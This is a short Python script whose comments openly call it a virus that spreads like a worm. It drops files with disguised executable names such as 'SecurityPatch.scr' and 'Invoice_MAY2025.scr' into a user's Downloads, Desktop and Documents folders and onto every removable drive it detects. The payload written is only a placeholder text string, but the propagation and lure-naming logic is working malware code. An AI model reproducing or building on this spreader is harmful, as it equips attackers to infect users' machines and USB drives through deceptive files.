import os
import random
import psutil #for removable drive checking
def spreader():
    parts=psutil.disk_partitions() # get all the partions we will further check if they are removable or not so that the virus can spread
    file_names = ["ReportGenerator.exe","Invoice_MAY2025.scr","SystemUpdate.com","PhotoViewer.exe","UserManual.scr","Setup_Files.exe","TaskScheduler.com","SecurityPatch.scr","DownloadManager.exe","MusicPlayer.scr","GameLauncher.com","AppInstaller.exe","DesktopCleaner.scr","NewVersion.exe","BackupTool.com","ImageEditor.scr","FileOrganizer.exe","SoftwareUpdate.scr","ZipExtractor.com","DocumentViewer.exe"]
    folders=["Downloads","Desktop","Documents"]
    for folder in folders:
        path = os.path.join(os.getenv("USERPROFILE"), folder)
        file_name=random.choice(file_names)
        file_path = os.path.join(path, file_name)
        if os.path.exists(file_path):
            continue
        try:
            with open(file_path, "wb") as f:
                f.write("Your playground is now tainted".encode())
        except Exception as e:
            print(f"Welp not able to create the file in the {folder} the error we got is {e}")
            continue
    for part in parts: # infecting the removables makes the virus act kind of like a worm with its spreading capabilities
        if "removable" in part.opts: # if a partion is a removable drive it will have removable in the opts
            file_name=random.choice(file_names)
            path = os.path.join(part.mountpoint, file_name)
            if os.path.exists(path):
                continue
            try:
                with open(path, "wb") as f:
                    f.write("Your playground is now tainted".encode())
            except Exception as e:
                print(f"Welp not able to create the file in the removable drive the error we got is {e}")
                continue